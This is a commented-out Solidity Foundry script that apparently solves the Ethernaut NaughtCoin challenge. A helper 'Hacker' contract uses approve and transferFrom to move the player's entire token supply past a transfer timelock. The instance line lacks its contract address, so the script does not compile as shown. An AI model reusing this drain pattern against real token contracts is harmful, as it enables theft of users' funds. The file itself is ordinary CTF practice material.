// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import {Script, console} from "forge-std/Script.sol";
// import {NaughtCoin} from "../src/NaughtCoin.sol";

// contract Hacker {
//     NaughtCoin coin;
//     constructor(NaughtCoin _coin) {
//         coin = _coin;
//     }

//     function attack() public {
//         address player = coin.player();
//         uint256 balance = coin.INITIAL_SUPPLY();
//         coin.transferFrom(player, address(this), balance);
//     }
// }

// contract NaughtCoinSolution is Script {
//     NaughtCoin public instance = NaughtCoin();
//     function run() external {
//         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
//         console.log("My balance: ", instance.balanceOf(vm.envAddress("MY_ADDRESS")));
//         Hacker hacker = new Hacker(instance);
//         instance.approve(address(hacker), instance.INITIAL_SUPPLY());
//         hacker.attack();
//         console.log("My balance: ", instance.balanceOf(vm.envAddress("MY_ADDRESS")));
//         vm.stopBroadcast();
//     }
// }
